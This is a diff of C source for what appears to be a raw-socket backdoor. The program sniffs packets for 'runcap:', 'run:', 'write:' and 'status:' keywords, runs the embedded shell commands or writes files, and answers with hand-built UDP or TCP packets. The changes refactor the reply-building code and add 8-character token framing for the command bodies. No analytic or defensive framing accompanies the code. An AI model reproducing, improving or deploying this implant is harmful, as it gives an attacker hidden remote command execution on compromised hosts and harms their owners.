@@ -18,7 +18,8 @@
 static int sockfd;
 static const char _sh[] = "/bin/sh";
 static uint16_t tcp_window = 509;
-static uint16_t ip_id_counter;
+static uint16_t ip_id_counter = 0xbeef;
+
 
 static uint16_t next_ip_id(void) {
     return ++ip_id_counter;
@@ -97,42 +98,47 @@ static void ip_checksum(struct iphdr *ip) {
     ip->check = (unsigned short)~sum;
 }
 
+static void prepare_reply(unsigned char *buf, struct ethhdr *ehdr, struct iphdr *ip,
+                          struct sockaddr_ll *sa, int ifindex,
+                          int protocol, int payload_len) {
+    struct ethhdr *orig_eth = (struct ethhdr *)buf;
+    struct iphdr  *orig_ip  = (struct iphdr *)(buf + sizeof(struct ethhdr));
+
+    memcpy(ehdr->h_dest, orig_eth->h_source, ETH_ALEN);
+    memcpy(ehdr->h_source, orig_eth->h_dest, ETH_ALEN);
+    ehdr->h_proto = htons(ETH_P_IP);
+
+    ip->version  = 4;
+    ip->ihl      = 5;
+    ip->ttl      = 64;
+    ip->id       = htons(next_ip_id());
+    ip->frag_off = htons(IP_DF);
+    ip->protocol = protocol;
+    ip->tot_len  = htons(20 + payload_len);
+    ip->saddr    = orig_ip->daddr;
+    ip->daddr    = orig_ip->saddr;
+    ip_checksum(ip);
+
+    sa->sll_family  = PF_PACKET;
+    sa->sll_ifindex = ifindex;
+    sa->sll_halen   = ETH_ALEN;
+    memcpy(sa->sll_addr, orig_eth->h_source, ETH_ALEN);
+}
+
 static void send_reply(unsigned char *buf, int ifindex,
                        uint16_t sport, uint16_t dport,
                        const char *msg, int msglen) {
     struct udpframe frame;
     struct sockaddr_ll sa;
-    struct ethhdr *orig_eth = (struct ethhdr *)buf;
-    struct iphdr  *orig_ip  = (struct iphdr *)(buf + sizeof(struct ethhdr));
-
     memset(&frame, 0, sizeof(frame));
     memset(&sa, 0, sizeof(sa));
 
-    memcpy(frame.ehdr.h_dest, orig_eth->h_source, ETH_ALEN);
-    memcpy(frame.ehdr.h_source, orig_eth->h_dest, ETH_ALEN);
-    frame.ehdr.h_proto = htons(ETH_P_IP);
-
-    frame.ip.version  = 4;
-    frame.ip.ihl      = 5;
-    frame.ip.ttl      = 64;
-    frame.ip.id       = htons(next_ip_id());
-    frame.ip.frag_off = htons(IP_DF);
-    frame.ip.protocol = IPPROTO_UDP;
-    frame.ip.tot_len  = htons(20 + 8 + msglen);
-    frame.ip.saddr    = orig_ip->daddr;
-    frame.ip.daddr    = orig_ip->saddr;
-    ip_checksum(&frame.ip);
+    prepare_reply(buf, &frame.ehdr, &frame.ip, &sa, ifindex, IPPROTO_UDP, 8 + msglen);
 
     frame.udp.source = dport;
     frame.udp.dest   = sport;
     frame.udp.len    = htons(8 + msglen);
-
     memcpy(frame.data, msg, msglen);
-
-    sa.sll_family  = PF_PACKET;
-    sa.sll_ifindex = ifindex;
-    sa.sll_halen   = ETH_ALEN;
-    memcpy(sa.sll_addr, orig_eth->h_source, ETH_ALEN);
 
     int total = sizeof(struct ethhdr) + 20 + 8 + msglen;
     sendto(sockfd, &frame, total, 0, (struct sockaddr *)&sa, sizeof(sa));
@@ -192,26 +198,11 @@ static void send_tcp_reply(unsigned char *buf, int ifindex,
                            const char *msg, int msglen) {
     struct tcpframe frame;
     struct sockaddr_ll sa;
-    struct ethhdr *orig_eth = (struct ethhdr *)buf;
-    struct iphdr  *orig_ip  = (struct iphdr *)(buf + sizeof(struct ethhdr));
 
     memset(&frame, 0, sizeof(frame));
     memset(&sa, 0, sizeof(sa));
 
-    memcpy(frame.ehdr.h_dest, orig_eth->h_source, ETH_ALEN);
-    memcpy(frame.ehdr.h_source, orig_eth->h_dest, ETH_ALEN);
-    frame.ehdr.h_proto = htons(ETH_P_IP);
-
-    frame.ip.version  = 4;
-    frame.ip.ihl      = 5;
-    frame.ip.ttl      = 64;
-    frame.ip.id       = htons(next_ip_id());
-    frame.ip.frag_off = htons(IP_DF);
-    frame.ip.protocol = IPPROTO_TCP;
-    frame.ip.tot_len  = htons(20 + 32 + msglen);
-    frame.ip.saddr    = orig_ip->daddr;
-    frame.ip.daddr    = orig_ip->saddr;
-    ip_checksum(&frame.ip);
+    prepare_reply(buf, &frame.ehdr, &frame.ip, &sa, ifindex, IPPROTO_TCP, 32 + msglen);
 
     uint32_t in_tsval, in_tsecr;
     extract_tcp_ts(buf, &in_tsval, &in_tsecr);
@@ -239,11 +230,6 @@ static void send_tcp_reply(unsigned char *buf, int ifindex,
 
     frame.tcp.check = tcp_checksum(&frame.ip, &frame.tcp, frame.tcp_opts, 12 + msglen);
 
-    sa.sll_family  = PF_PACKET;
-    sa.sll_ifindex = ifindex;
-    sa.sll_halen   = ETH_ALEN;
-    memcpy(sa.sll_addr, orig_eth->h_source, ETH_ALEN);
-
     int total = sizeof(struct ethhdr) + 20 + 32 + msglen;
     sendto(sockfd, &frame, total, 0, (struct sockaddr *)&sa, sizeof(sa));
 
@@ -258,7 +244,7 @@ struct reply_ctx {
     int      is_tcp;
     uint32_t tcp_seq;
     uint32_t tcp_ack;
-    char     token[16];
+    char     token[9];
     int      token_len;
 };
 
@@ -377,6 +363,36 @@ static void sighandler(int sig) {
     _exit(0);
 }
 
+static char *find_cmd(const char *payload, int payload_len,
+                      const char *keyword, int kwlen) {
+    const char *end = payload + payload_len;
+    const char *p = end - kwlen;
+    while (p >= payload) {
+        if (!memcmp(p, keyword, kwlen)) {
+            const char *rest = p + kwlen;
+            int remain = end - rest;
+            if (remain >= 9 && rest[8] == ':')
+                return (char *)p;
+        }
+        p--;
+    }
+    return NULL;
+}
+
+static char *extract_body(char *rest, int rest_len, char *token, int *body_len) {
+    memcpy(token, rest, 8);
+    token[8] = '\0';
+    char *body = rest + 9;
+    int body_max = rest_len - 9;
+    char end_mark[10];
+    end_mark[0] = ':';
+    memcpy(end_mark + 1, token, 8);
+    char *end = memmem(body, body_max, end_mark, 9);
+    if (!end) return NULL;
+    *body_len = end - body;
+    return body;
+}
+
 static void dispatch(char *payload, int payload_len, unsigned char *buf,
                      int ifindex, uint16_t sport, uint16_t dport,
                      int is_tcp, uint32_t tcp_seq, uint32_t tcp_ack) {
@@ -384,59 +400,48 @@ static void dispatch(char *payload, int payload_len, unsigned char *buf,
                              is_tcp, tcp_seq, tcp_ack, {0}, 0 };
 
     char *match;
-    if ((match = memmem(payload, payload_len, "runcap:", 7))) {
-        int off = match - payload;
+    char token[9];
+    char *body;
+    int body_len;
+
+    if ((match = find_cmd(payload, payload_len, "runcap:", 7))) {
+        body = extract_body(match + 7, payload_len - (match + 7 - payload), token, &body_len);
+        if (body) {
+            body[body_len] = '\0';
+            ctx.token_len = 8;
+            memcpy(ctx.token, token, 9);
+            run_captured(body, &ctx);
+        }
+    } else if ((match = find_cmd(payload, payload_len, "run:", 4))) {
+        body = extract_body(match + 4, payload_len - (match + 4 - payload), token, &body_len);
+        if (body) {
+            body[body_len] = '\0';
+            run_detached(body);
+        }
+    } else if ((match = find_cmd(payload, payload_len, "write:", 6))) {
+        body = extract_body(match + 6, payload_len - (match + 6 - payload), token, &body_len);
+        if (body)
+            handle_write(body, body_len);
+    } else if ((match = find_cmd(payload, payload_len, "status:", 7))) {
         char *rest = match + 7;
-        int rest_len = payload_len - off - 7;
-        char *colon = memchr(rest, ':', rest_len);
-        if (colon && colon - rest > 0 && colon - rest < (int)sizeof(ctx.token)) {
-            ctx.token_len = colon - rest;
-            memcpy(ctx.token, rest, ctx.token_len);
-            ctx.token[ctx.token_len] = '\0';
-            char *cmd = colon + 1;
-            int cmd_max = rest_len - (colon - rest) - 1;
-            char end_mark[18];
-            end_mark[0] = ':';
-            memcpy(end_mark + 1, ctx.token, ctx.token_len);
-            char *cmd_end = memmem(cmd, cmd_max, end_mark, 1 + ctx.token_len);
-            if (cmd_end)
-                *cmd_end = '\0';
-            run_captured(cmd, &ctx);
+        int rest_len = payload_len - (rest - payload);
+        ctx.token_len = 8;
+        memcpy(ctx.token, rest, 8);
+        ctx.token[8] = '\0';
+        if (rest_len >= 17 && !memcmp(rest + 9, rest, 8)) {
+            char reply[32];
+            memcpy(reply, ctx.token, 8);
+            memcpy(reply + 8, "up", 2);
+            if (is_tcp)
+                send_tcp_reply(buf, ifindex, sport, dport,
+                               &ctx.tcp_seq, ctx.tcp_ack, reply, 10);
+            else
+                send_reply(buf, ifindex, sport, dport, reply, 10);
         }
-    } else if ((match = memmem(payload, payload_len, "run:", 4)))
-        run_detached(match + 4);
-    else if ((match = memmem(payload, payload_len, "write:", 6))) {
-        int off = match - payload;
-        handle_write(match + 6, payload_len - off - 6);
-    } else if ((match = memmem(payload, payload_len, "status", 6))) {
-        int off = match - payload;
-        int remaining = payload_len - off;
-        if (remaining > 7 && match[6] == ':') {
-            int tlen = remaining - 7;
-            if (tlen > 0 && tlen < (int)sizeof(ctx.token)) {
-                ctx.token_len = tlen;
-                memcpy(ctx.token, match + 7, tlen);
-                ctx.token[tlen] = '\0';
-            }
-        }
-        char reply[32];
-        int rlen = 0;
-        if (ctx.token_len > 0) {
-            memcpy(reply, ctx.token, ctx.token_len);
-            rlen = ctx.token_len;
-        }
-        memcpy(reply + rlen, "up", 2);
-        rlen += 2;
-        if (is_tcp)
-            send_tcp_reply(buf, ifindex, sport, dport,
-                           &ctx.tcp_seq, ctx.tcp_ack, reply, rlen);
-        else
-            send_reply(buf, ifindex, sport, dport, reply, rlen);
     }
 }
 
 int main(void) {
-    ip_id_counter = rand();
     compute_tcp_window();
     enumerate_local_ips();
 
@@ -455,7 +460,6 @@ int main(void) {
     for (;;) {
         struct sockaddr_ll from;
         socklen_t fromlen = sizeof(from);
-        memset(buf, 0, sizeof(buf));
 
         int n = recvfrom(sockfd, buf, sizeof(buf), 0,
                          (struct sockaddr *)&from, &fromlen);
